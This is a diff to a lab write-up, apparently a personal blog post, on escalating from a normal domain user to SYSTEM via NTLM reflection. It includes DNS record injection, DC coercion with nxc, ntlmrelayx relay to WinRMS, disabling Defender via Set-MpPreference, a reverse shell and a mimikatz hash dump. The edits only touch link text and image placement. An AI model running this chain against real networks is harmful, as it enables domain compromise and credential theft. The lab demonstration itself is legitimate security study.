@@ -49,7 +49,7 @@ python3 dnstool.py -u LAB\\john -p 'marioKart1' --action add --record localhost1
 
 ```
 For more details on this weird DNS record and why it’s needed, check this blog post:
-[text](https://www.synacktiv.com/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025)
+[synacktiv](https://www.synacktiv.com/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025)
 
 ## Coercing the DC
 
@@ -62,7 +62,7 @@ nxc smb 192.168.10.10 -u 'john' -p 'marioKart1' -M coerce_plus -o LISTENER=local
 The DC has WinRM over HTTPS enabled (port 5986). To relay to it I setup a listener using impacket-ntlmrelayx
 
 
-![The command for relay](relay.png)
+
 
 ```bash
 python3 examples/ntlmrelayx.py -t winrms://192.168.10.10 -smb2support --remove-mic -debug
@@ -109,6 +109,8 @@ Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its aff
 [*] winrms:///@192.168.10.10 [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000
 
 ```
+![The command for relay](relay.png)
+
 I can then connect to the interactive shell and grabs the funny flag that I made.
 
 ```bash
@@ -137,7 +139,7 @@ powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
 
-Now I can get a better and more usable revshell, I just grab the Powershell#3 (base64) from revshell.com then dump the hash using mimikatz
+Now I can get a better and more usable revshell, I just grab the Powershell#3 (base64) payload from [revshells.com](https://www.revshells.com/) then dump the hash using mimikatz
 
 ![Dumping hashes](mimikatz.png)
 
@@ -192,5 +194,7 @@ SID               : S-1-5-21-1336586935-998966762-933632514-500
         ssp :
         credman :
 ```
+Hope you enjoyed this little demonstration on how to go from a "normal" user to NT system using NTLM reflection.
+
 
 **Thx for reading my first post !!**
